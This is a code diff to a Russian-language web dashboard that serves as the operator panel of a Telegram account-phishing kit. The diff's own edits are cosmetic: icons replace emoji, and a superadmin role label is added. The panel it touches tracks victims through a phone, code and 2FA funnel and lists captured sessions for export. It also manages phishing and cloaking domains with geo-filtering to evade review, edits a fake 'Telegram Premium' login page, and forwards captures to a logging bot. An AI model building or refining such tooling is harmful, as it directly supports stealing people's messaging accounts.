@@ -386,6 +386,10 @@
     mix-blend-mode:multiply;}
   @keyframes oscBlink{50%{opacity:.3}}
   .osc-svg .osc-live{animation:oscBlink 1.4s steps(1) infinite;}
+
+  /* моно-бейдж кода страны (вместо флаг-эмодзи) */
+  .cc{display:inline-block;font:10px 'Share Tech Mono',monospace;color:var(--accent);
+    border:1px solid var(--card-border);padding:0 4px;letter-spacing:.06em;line-height:16px;}
 </style>
 </head>
 <body>
@@ -431,6 +435,14 @@
       <symbol id="ic-funnel-msg" viewBox="0 0 24 24"><path d="M3 5h18v12H8l-5 4V5Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/><path d="M7 10h10M7 13h6" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></symbol>
       <symbol id="ic-funnel-key" viewBox="0 0 24 24"><circle cx="8" cy="16" r="4" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M11 13l9-9M16 8l2 2M18 6l2 2" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></symbol>
       <symbol id="ic-funnel-done" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M8 12l3 3 5-6" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-phone" viewBox="0 0 24 24"><rect x="6" y="2" width="12" height="20" rx="2.5" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M10 19h4" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></symbol>
+      <symbol id="ic-key" viewBox="0 0 24 24"><circle cx="8" cy="16" r="4" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M11 13l9-9M16 8l2 2M18 6l2 2" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></symbol>
+      <symbol id="ic-mail" viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="14" rx="2" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M4 7l8 6 8-6" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-ban" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="1.9"/><path d="M5.6 5.6l12.8 12.8" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/></symbol>
+      <symbol id="ic-box" viewBox="0 0 24 24"><path d="M3 7l9-4 9 4v10l-9 4-9-4V7Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/><path d="M3 7l9 4 9-4M12 11v10" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-image" viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="16" rx="2" fill="none" stroke="currentColor" stroke-width="1.9"/><circle cx="8.5" cy="9.5" r="1.6" fill="currentColor"/><path d="M5 18l5-5 4 4 2-2 3 3" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+      <symbol id="ic-circle" viewBox="0 0 24 24"><circle cx="12" cy="12" r="8" fill="none" stroke="currentColor" stroke-width="1.9"/></symbol>
+      <symbol id="ic-pin" viewBox="0 0 24 24"><path d="M12 22s7-7.2 7-12a7 7 0 0 0-14 0c0 4.8 7 12 7 12Z" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linejoin="round"/><circle cx="12" cy="10" r="2.4" fill="none" stroke="currentColor" stroke-width="1.9"/></symbol>
     </defs>
   </svg>
 
@@ -538,7 +550,7 @@ const DATA = {
   ],
   logbot:{connected:true,name:'@my_log_bot',chat:'-1001234567890',
     triggers:{done:true,phone:true,twofa:true,code:false,bad_code:false,page:false}},
-  user:{username:'@username',tg_id:5984466650},
+  user:{username:'@username',tg_id:5984466650,is_admin:true},
   stats:{
     funnel:{clicks:12044,loads:10880,phones:8923,codes:6711,twofa:2344,done:1420},
     conversion:11.8,
@@ -548,11 +560,11 @@ const DATA = {
       {name:'third.net',done:34,conv:8.1},
     ],
     geo:[
-      {code:'RU',flag:'🇷🇺',count:6234,pct:52},
-      {code:'UA',flag:'🇺🇦',count:2011,pct:16},
-      {code:'BY',flag:'🇧🇾',count:980,pct:8},
-      {code:'KZ',flag:'🇰🇿',count:601,pct:5},
-      {code:'XX',flag:'🌍',count:2218,pct:19,other:true},
+      {code:'RU',count:6234,pct:52},
+      {code:'UA',count:2011,pct:16},
+      {code:'BY',count:980,pct:8},
+      {code:'KZ',count:601,pct:5},
+      {code:'XX',count:2218,pct:19,other:true},
     ],
   },
 };
@@ -617,20 +629,22 @@ function funnelBlock(f){
 }
 
 const CHEV = `<svg class="chev-svg"><use href="#ic-chev"/></svg>`;
+// инлайн-иконка вместо эмодзи: ico('phone'), ico('check','x16 t-ok')
+const ico = (id,cls='x14')=>`<svg class="svgi ${cls}"><use href="#ic-${id}"/></svg>`;
 
 function statusPill(s){
   const map={
-    done:['ok','✅ done'],
-    '2fa':['warn','⏳ 2fa'],
-    dead:['err','💀 dead'],
-    spamblock:['err','🚫 spam'],
-    exported:['muted','📦 exported'],
-    active:['ok','● ACTIVE'],
-    pending:['warn','⏳ PENDING'],
-    error:['err','❌ ERROR'],
+    done:['ok','check','done'],
+    '2fa':['warn','clock','2fa'],
+    dead:['err','skull','dead'],
+    spamblock:['err','ban','spam'],
+    exported:['muted','box','exported'],
+    active:['ok','','● ACTIVE'],
+    pending:['warn','clock','PENDING'],
+    error:['err','x','ERROR'],
   };
-  const [cls,txt]=map[s]||['muted',s];
-  return `<span class="pill ${cls}">${esc(txt)}</span>`;
+  const [cls,icon,txt]=map[s]||['muted','',s];
+  return `<span class="pill ${cls}">${icon?ico(icon,'x14')+' ':''}${esc(txt)}</span>`;
 }
 
 /* ============ NAV / ROUTER ============ */
@@ -701,7 +715,7 @@ screens.home = ()=>{
         <div class="srow" onclick="nav.go('sessionCard',{id:${s.id}})">
           <div class="grow">
             <div class="phone">${esc(s.phone.replace(/\d{2}-\d{2}$/,'··'))}</div>
-            <div class="meta">${esc(s.status)} · ${s.premium?'⭐ Premium':'——'} · ${s.ago}</div>
+            <div class="meta">${esc(s.status)} · ${s.premium?ico('star','x14 t-warn')+' Premium':'——'} · ${s.ago}</div>
           </div>
           <span class="chev">${CHEV}</span>
         </div>
@@ -743,17 +757,17 @@ function renderDomainsList(list){
     let body='';
     if(d.status==='active' && d.type==='phishing'){
       const s=d.stats;
-      body=`<div class="t-muted">phishing · <span class="t-ok">ACTIVE</span> · CF: ✅</div>
+      body=`<div class="t-muted">phishing · <span class="t-ok">ACTIVE</span> · CF ${ico('check','x14 t-ok')}</div>
         <div class="row gap-m mt-s">
-          <span>✅ <span class="num t-mag">${s.done}</span></span>
-          <span>📱 <span class="num">${s.phones}</span></span>
-          <span>🔑 <span class="num">${s.twofa}</span></span>
+          <span class="row gap-s">${ico('funnel-done','x16 t-mag')}<span class="num t-mag">${s.done}</span></span>
+          <span class="row gap-s">${ico('phone','x14')}<span class="num">${s.phones}</span></span>
+          <span class="row gap-s">${ico('key','x14')}<span class="num">${s.twofa}</span></span>
         </div>
         <div class="t-muted mt-s">шаблон: ${esc(d.template)}</div>`;
     } else if(d.status==='active' && d.type==='cloaking'){
-      body=`<div class="t-muted">cloaking · <span class="t-ok">ACTIVE</span> · CF: ✅</div>
+      body=`<div class="t-muted">cloaking · <span class="t-ok">ACTIVE</span> · CF ${ico('check','x14 t-ok')}</div>
         <div class="row gap-m mt-s">
-          <span>👁 <span class="num t-mag">${d.stats.clicks.toLocaleString('ru')}</span> кликов</span>
+          <span class="row gap-s">${ico('eye','x16 t-mag')}<span class="num t-mag">${d.stats.clicks.toLocaleString('ru')}</span> кликов</span>
         </div>`;
     } else if(d.status==='pending'){
       body=`<div class="t-muted">${esc(d.type)} · <span class="t-warn">PENDING NS</span></div>
@@ -765,7 +779,7 @@ function renderDomainsList(list){
     return `<div class="card" onclick="nav.go('domainCard',{id:${d.id}})">
       <div class="row between">
         <div class="grow">
-          <div class="row gap-s"><span class="t-acc">${d.status==='pending'?'⏳':d.status==='error'?'❌':'●'}</span><b style="font-size:14px">${esc(d.fqdn)}</b></div>
+          <div class="row gap-s"><span class="t-acc">${d.status==='pending'?ico('clock','x14 t-warn'):d.status==='error'?ico('x','x14 t-err'):'●'}</span><b style="font-size:14px">${esc(d.fqdn)}</b></div>
           ${body}
         </div>
         <span class="chev">${CHEV}</span>
@@ -836,10 +850,10 @@ function openCreateDomain(){
 }
 function onDomainCreated(){
   openSheet(`
-    <div class="sheet-title">✅ Домен создан!</div>
+    <div class="sheet-title row gap-s">${ico('funnel-done','x18 t-ok')} Домен создан!</div>
     <div class="t-muted mb-m">Пропишите NS у регистратора:</div>
-    <div class="codeblock mb-s" onclick="copyText('ns1.cloudflare.com')">ns1.cloudflare.com  📋</div>
-    <div class="codeblock mb-m" onclick="copyText('ns2.cloudflare.com')">ns2.cloudflare.com  📋</div>
+    <div class="codeblock mb-s row between" onclick="copyText('ns1.cloudflare.com')">ns1.cloudflare.com ${ico('copy','x14')}</div>
+    <div class="codeblock mb-m row between" onclick="copyText('ns2.cloudflare.com')">ns2.cloudflare.com ${ico('copy','x14')}</div>
     <div class="t-muted mb-m" style="line-height:1.55">Статус обновится автоматически<br>(~5–30 минут после делегирования)</div>
     <button class="btn" onclick="closeSheet();nav.goTab('domains');toast('Домен создан')">Понятно</button>
   `);
@@ -861,12 +875,12 @@ screens.domainCard = (p)=>{
       <div class="row gap-s mb-s">
         ${statusPill(d.status)}
         <span class="pill muted">${esc(d.type)}</span>
-        ${d.cf?'<span class="pill ok">CF ✓</span>':''}
+        ${d.cf?`<span class="pill ok">${ico('check','x14')} CF</span>`:''}
         ${d.sb==='clean'?'<span class="pill ok">SB Clean</span>':''}
       </div>
       ${d.zone?`<div class="t-muted">CF Zone: ${esc(d.zone)}</div>`:''}
       ${d.created?`<div class="t-muted">Создан: ${esc(d.created)}</div>`:''}
-      ${d.status==='pending'?`<div class="card static"><div class="t-label mb-s">Жду NS</div>${d.ns.map(n=>`<div class="codeblock mb-s" onclick="copyText('${esc(n)}')">${esc(n)} 📋</div>`).join('')}</div>`:''}
+      ${d.status==='pending'?`<div class="card static"><div class="t-label mb-s">Жду NS</div>${d.ns.map(n=>`<div class="codeblock mb-s row between" onclick="copyText('${esc(n)}')">${esc(n)} ${ico('copy','x14')}</div>`).join('')}</div>`:''}
       ${d.status==='error'?`<div class="card static"><div class="t-err">${esc(d.err)}</div></div>`:''}
       ${funnel}
       ${d.status==='active' && d.type==='phishing' ? `
@@ -875,12 +889,12 @@ screens.domainCard = (p)=>{
           <div class="row between mb-s"><span class="t-label">Шаблон</span><span>${esc(d.template)} <span class="chev">${CHEV}</span></span></div>
           <div class="row between mb-s"><span class="t-label">Redirect</span><span class="t-muted nowrap" style="overflow:hidden;text-overflow:ellipsis;max-width:60%">${esc(d.redirect||'—')}</span></div>
           <div class="row between"><span class="t-label">FB Pixel</span><span class="t-muted">—</span></div>
-          <button class="btn ghost small mt-m" onclick="openEditDomain(${d.id})">✏️ Редактировать</button>
+          <button class="btn ghost small mt-m" onclick="openEditDomain(${d.id})">${ico('edit','x14')} Редактировать</button>
         </div>
         <div class="section-label">Ссылки</div>
         <div class="card" onclick="nav.go('phishLinks',{domainId:${d.id}})">
           <div class="row between">
-            <span>📎 lorem — <b>${(d.phishLinks||[]).length}</b></span>
+            <span class="row gap-s">${ico('link','x16 t-acc')} lorem — <b>${(d.phishLinks||[]).length}</b></span>
             <span class="chev">${CHEV}</span>
           </div>
         </div>
@@ -889,7 +903,7 @@ screens.domainCard = (p)=>{
         <div class="section-label">Cloaking-ссылки</div>
         <div class="card" onclick="nav.go('cloakLinks',{domainId:${d.id}})">
           <div class="row between">
-            <span>🎭 ссылки — <b>${(d.cloakLinks||[]).length}</b></span>
+            <span class="row gap-s">${ico('mask','x16 t-acc')} ссылки — <b>${(d.cloakLinks||[]).length}</b></span>
             <span class="chev">${CHEV}</span>
           </div>
         </div>
@@ -942,12 +956,12 @@ screens.phishLinks = (p)=>{
       ${(d.phishLinks||[]).map(l=>`
         <div class="card static">
           <div class="row between mb-s">
-            <span>📎 <b>${esc(l.label)}</b></span>
+            <span class="row gap-s">${ico('link','x16 t-acc')} <b>${esc(l.label)}</b></span>
             <span class="t-mag num">${l.conv}%</span>
           </div>
-          <div class="codeblock mb-s" onclick="copyText('${esc(d.fqdn)}/${esc(l.slug)}')">${esc(d.fqdn)}/${esc(l.slug)}</div>
+          <div class="codeblock mb-s row between" onclick="copyText('${esc(d.fqdn)}/${esc(l.slug)}')">${esc(d.fqdn)}/${esc(l.slug)} ${ico('copy','x14')}</div>
           <div class="row gap-m t-muted mb-s" style="font-size:11px">
-            <span>👁 ${l.clicks}</span><span>📱 ${l.phones}</span><span>✅ ${l.done}</span>
+            <span class="row gap-s">${ico('eye','x14')} ${l.clicks}</span><span class="row gap-s">${ico('phone','x14')} ${l.phones}</span><span class="row gap-s">${ico('check','x14')} ${l.done}</span>
           </div>
           <div class="row gap-s">
             <button class="icobtn" onclick="copyText('${esc(d.fqdn)}/${esc(l.slug)}')" title="URL"><svg class="svgi"><use href="#ic-copy"/></svg></button>
@@ -993,8 +1007,8 @@ screens.linkStats = (p)=>{
       <div class="section-label">Гео ТОП-5</div>
       <div class="card static">
         ${DATA.stats.geo.map(g=>`
-          <div class="funnel-row" style="grid-template-columns:24px 1fr 60px 80px">
-            <span style="font-size:14px">${g.flag}</span>
+          <div class="funnel-row" style="grid-template-columns:28px 1fr 60px 80px">
+            <span>${flagOf(g.code)}</span>
             <span class="lbl">${g.code} · ${Math.round(g.count*0.06)}</span>
             <span class="val">${g.pct}%</span>
             <div class="bar"><i style="width:${g.pct*1.6}%"></i></div>
@@ -1027,7 +1041,7 @@ screens.cloakLinks = (p)=>{
       ${(d.cloakLinks||[]).map(l=>`
         <div class="card static">
           <div class="row between mb-s">
-            <span>🎭 <b>/${esc(l.slug)}</b></span>
+            <span class="row gap-s">${ico('mask','x16 t-acc')} <b>/${esc(l.slug)}</b></span>
             <span class="t-mag num">${l.total}</span>
           </div>
           <div class="t-muted mb-s" style="font-size:11.5px;line-height:1.7">
@@ -1035,7 +1049,7 @@ screens.cloakLinks = (p)=>{
             White:  <span class="t-acc">${esc(l.white)}</span><br>
             Гео:    ${l.geoMode==='whitelist'?'Whitelist':l.geoMode==='blacklist'?'Blacklist':'Off'} ${l.countries.map(c=>flagOf(c)).join(' ')}
           </div>
-          <div class="t-muted mb-s" style="font-size:11px">👁 total: ${l.total} · offer: ${l.offerCount}</div>
+          <div class="t-muted mb-s row gap-s" style="font-size:11px">${ico('eye','x14')} total: ${l.total} · offer: ${l.offerCount}</div>
           <div class="row gap-s">
             <button class="icobtn" onclick="nav.go('cloakLinkEdit',{domainId:${d.id},linkId:${l.id}})" title="Редактировать"><svg class="svgi"><use href="#ic-edit"/></svg></button>
             <button class="icobtn" onclick="copyText('${esc(d.fqdn)}/${esc(l.slug)}')" title="URL"><svg class="svgi"><use href="#ic-copy"/></svg></button>
@@ -1047,7 +1061,7 @@ screens.cloakLinks = (p)=>{
     `
   };
 };
-function flagOf(c){return ({RU:'🇷🇺',BY:'🇧🇾',KZ:'🇰🇿',UA:'🇺🇦',US:'🇺🇸'})[c]||'🏳';}
+function flagOf(c){return (c==='XX'||c==='OTHER')?ico('globe','x14'):`<span class="cc">${esc(c)}</span>`;}
 
 /* ---- BOT BASE (своя база ботов для фильтрации трафика) ---- */
 function _isIPv4(s){
@@ -1203,7 +1217,7 @@ screens.cloakLinkEdit = (p)=>{
       <div class="field-row">
         <div class="lbl">Страны</div>
         <div class="row gap-s wrap">
-          ${l.countries.map(c=>`<div class="chip active">${flagOf(c)} ${c} ✕</div>`).join('')}
+          ${l.countries.map(c=>`<div class="chip active row gap-s">${flagOf(c)} ${c} ${ico('x','x14')}</div>`).join('')}
           <div class="chip" onclick="toast('Выбор страны')">+</div>
         </div>
       </div>
@@ -1242,11 +1256,11 @@ screens.sessions = ()=>{
     html:`
       <div class="row between mb-s">
         <span class="t-label">Всего: ${DATA.sessions.length}</span>
-        <button class="btn small ghost" onclick="openSessionFilter()">⚙ фильтр</button>
+        <button class="btn small ghost" onclick="openSessionFilter()">${ico('filter','x14')} фильтр</button>
       </div>
       <div class="chips">
         ${['all','done','2fa','dead'].map(s=>`<div class="chip ${SESS_FILT.status===s?'active':''}" onclick="SESS_FILT.status='${s}';nav._render()">${s==='all'?'Все':s}</div>`).join('')}
-        <div class="chip" onclick="toast('Экспорт начат')">📦 export</div>
+        <div class="chip" onclick="toast('Экспорт начат')">${ico('box','x14')} export</div>
       </div>
       <div class="card tight static row between" id="bulkbar">
         <div class="check ${SESS_FILT.selected.size===list.length&&list.length?'on':''}" onclick="toggleAllSess()"><span class="box"></span><span>Выбрать все (${SESS_FILT.selected.size} выбрано)</span></div>
@@ -1284,9 +1298,9 @@ function bulkActions(){
   if(!SESS_FILT.selected.size) return toast('Сначала выберите',true);
   openSheet(`
     <div class="sheet-title">Действия (${SESS_FILT.selected.size})</div>
-    <button class="btn ghost mb-s" onclick="closeSheet();toast('Проверка запущена')">✅ Проверить (макс 50)</button>
-    <button class="btn ghost mb-s" onclick="closeSheet();toast('Экспорт начат')">📦 Экспортировать</button>
-    <button class="btn danger" onclick="closeSheet();confirmSheet('Удалить выбранные?','${SESS_FILT.selected.size} сессий будут удалены.',()=>{SESS_FILT.selected.clear();nav._render();toast('Удалены');},true)">🗑 Удалить</button>
+    <button class="btn ghost mb-s" onclick="closeSheet();toast('Проверка запущена')">${ico('check','x14')} Проверить (макс 50)</button>
+    <button class="btn ghost mb-s" onclick="closeSheet();toast('Экспорт начат')">${ico('box','x14')} Экспортировать</button>
+    <button class="btn danger" onclick="closeSheet();confirmSheet('Удалить выбранные?','${SESS_FILT.selected.size} сессий будут удалены.',()=>{SESS_FILT.selected.clear();nav._render();toast('Удалены');},true)">${ico('trash','x14')} Удалить</button>
   `);
 }
 function openSessionFilter(){
@@ -1330,21 +1344,21 @@ screens.sessionCard = (p)=>{
         <button class="btn danger tiny" onclick="confirmSheet('Удалить сессию?','Действие необратимо.',()=>{nav.back();toast('Удалена');},true)"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-trash"/></svg>Удалить</button>
       </div>
       <div class="card static">
-        <div style="font-size:17px"><b>📱 ${esc(s.phone)}</b></div>
+        <div style="font-size:17px"><b class="row gap-s">${ico('phone','x18 t-acc')} ${esc(s.phone)}</b></div>
         ${s.username?`<div class="t-muted mt-s">${esc(s.username)} · ${esc(s.name||'')}</div>`:''}
         ${s.tg_id?`<div class="t-muted">TG ID: ${s.tg_id}</div>`:''}
-        ${s.dc?`<div class="t-muted">DC: ${s.dc} ${s.premium?`· ⭐ Premium (до ${s.premium_until||'—'})`:''}</div>`:''}
+        ${s.dc?`<div class="t-muted">DC: ${s.dc} ${s.premium?`· ${ico('star','x14 t-warn')} Premium (до ${s.premium_until||'—'})`:''}</div>`:''}
       </div>
       <div class="card static">
         <div class="row between"><span class="t-label">Статус</span>${statusPill(s.status)}</div>
-        <div class="row between mt-s"><span class="t-label">SpamBlock</span><span>${s.spamblock?'<span class="t-err">❌ есть</span>':'<span class="t-ok">✅ нет</span>'}</span></div>
+        <div class="row between mt-s"><span class="t-label">SpamBlock</span><span>${s.spamblock?`<span class="t-err row gap-s">${ico('x','x14 t-err')} есть</span>`:`<span class="t-ok row gap-s">${ico('check','x14 t-ok')} нет</span>`}</span></div>
       </div>
       <div class="section-label">Таймлайн lorem</div>
       <div class="card static">
-        <div class="row between mb-s"><span>📱 Телефон введён</span><span class="t-muted">${tl.phone||'—'}</span></div>
-        <div class="row between mb-s"><span>📨 Код введён ${dt(tl.phone,tl.code)}</span><span class="t-muted">${tl.code||'—'}</span></div>
-        <div class="row between mb-s"><span>🔑 2FA</span><span class="t-muted">${tl.twofa||'—'}</span></div>
-        <div class="row between"><span>✅ Завершено ${dt(tl.code,tl.done)}</span><span class="t-muted">${tl.done||'—'}</span></div>
+        <div class="row between mb-s"><span class="row gap-s">${ico('phone','x16 t-acc')} Телефон введён</span><span class="t-muted">${tl.phone||'—'}</span></div>
+        <div class="row between mb-s"><span class="row gap-s">${ico('mail','x16 t-acc')} Код введён ${dt(tl.phone,tl.code)}</span><span class="t-muted">${tl.code||'—'}</span></div>
+        <div class="row between mb-s"><span class="row gap-s">${ico('key','x16 t-acc')} 2FA</span><span class="t-muted">${tl.twofa||'—'}</span></div>
+        <div class="row between"><span class="row gap-s">${ico('funnel-done','x16 t-ok')} Завершено ${dt(tl.code,tl.done)}</span><span class="t-muted">${tl.done||'—'}</span></div>
       </div>
       ${s.contacts?`
       <div class="section-label">Данные аккаунта</div>
@@ -1406,14 +1420,14 @@ screens.stats = ()=>{
       ` : ''}
       ${STATS_TAB==='domains' ? `
         <div class="card static">
-          ${DATA.stats.topDomains.map((d,i)=>`<div class="row between mb-s"><span>${i+1}. ${esc(d.name)}</span><span>✅ <span class="t-mag num">${d.done}</span> <span class="t-muted">(${d.conv}%)</span></span></div>`).join('')}
+          ${DATA.stats.topDomains.map((d,i)=>`<div class="row between mb-s"><span>${i+1}. ${esc(d.name)}</span><span class="row gap-s">${ico('funnel-done','x16 t-ok')}<span class="t-mag num">${d.done}</span> <span class="t-muted">(${d.conv}%)</span></span></div>`).join('')}
         </div>
       ` : ''}
       ${STATS_TAB==='geo' ? `
         <div class="card static">
           ${DATA.stats.geo.map(g=>`
-            <div class="funnel-row" style="grid-template-columns:24px 1fr 60px 80px">
-              <span style="font-size:14px">${g.flag}</span>
+            <div class="funnel-row" style="grid-template-columns:28px 1fr 60px 80px">
+              <span>${flagOf(g.code)}</span>
               <span class="lbl">${g.code} · ${g.count.toLocaleString('ru')}</span>
               <span class="val">${g.pct}%</span>
               <div class="bar"><i style="width:${g.pct*1.6}%"></i></div>
@@ -1480,7 +1494,7 @@ screens.profile = ()=>{
           <div class="v" style="flex:1;gap:2px">
             <div class="id-name">@${esc(uname)}</div>
             <div class="id-meta">tg.id ${u.tg_id}</div>
-            <div class="id-meta">▲ ROLE: <span class="role">worker</span></div>
+            <div class="id-meta">▲ ROLE: <span class="role">${u.is_admin?'superadmin':'worker'}</span></div>
           </div>
           <div class="id-tag">ID_CARD</div>
         </div>
@@ -1603,7 +1617,7 @@ screens.templateEditor = (p)=>{
           <div style="font:18px 'VT323',monospace;margin-bottom:10px">Telegram Premium</div>
           <div style="background:${t.theme.accent_color};color:${t.theme.body_bg};padding:8px 14px;text-align:center;font-size:12px">ВОЙТИ</div>
         </div>
-        <button class="btn ghost small mt-m" onclick="toast('Тема сброшена')">🔄 Сбросить тему</button>
+        <button class="btn ghost small mt-m" onclick="toast('Тема сброшена')">${ico('refresh','x14')} Сбросить тему</button>
       </div>
       <div class="actbar">
         <button class="btn ghost small" onclick="toast('Стадия сброшена')"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-refresh"/></svg>Сбросить</button>
@@ -1628,8 +1642,8 @@ function renderTplPage(page,data){
           <div class="t-label">[текущее изображение]</div>
         </div>
         <div class="row gap-s mt-s">
-          <button class="btn ghost small" onclick="toast('Выбор файла')">📷 Загрузить</button>
-          <button class="btn ghost small" onclick="toast('Сброшено')">🗑 Удалить</button>
+          <button class="btn ghost small" onclick="toast('Выбор файла')">${ico('image','x14')} Загрузить</button>
+          <button class="btn ghost small" onclick="toast('Сброшено')">${ico('trash','x14')} Удалить</button>
         </div>
         <div class="field-hint">PNG / JPG / WebP, до 5 MB</div>
       </div>
@@ -1718,7 +1732,7 @@ screens.logbot = ()=>{
       title:'LogBot', tab:'profile',
       html:`
         <div class="card static">
-          <div class="row between"><span class="t-label">Статус</span><span class="pill muted">⭕ Не подключён</span></div>
+          <div class="row between"><span class="t-label">Статус</span><span class="pill muted">${ico('circle','x14')} Не подключён</span></div>
         </div>
         <div class="field-row"><div class="lbl">Bot Token</div><input class="input" type="password" placeholder="123456789:AAEhhHg..."></div>
         <div class="field-row"><div class="lbl">Chat ID</div><input class="input" placeholder="-1001234567890"></div>
@@ -1738,7 +1752,7 @@ screens.logbot = ()=>{
     title:'LogBot', tab:'profile',
     html:`
       <div class="card static">
-        <div class="row between mb-s"><span class="t-label">Статус</span><span class="pill ok">✅ Подключён</span></div>
+        <div class="row between mb-s"><span class="t-label">Статус</span><span class="pill ok">${ico('check','x14')} Подключён</span></div>
         <div class="row between mb-s"><span class="t-label">Бот</span><span>${esc(lb.name)}</span></div>
         <div class="row between"><span class="t-label">Чат</span><span class="t-muted">${esc(lb.chat)}</span></div>
       </div>
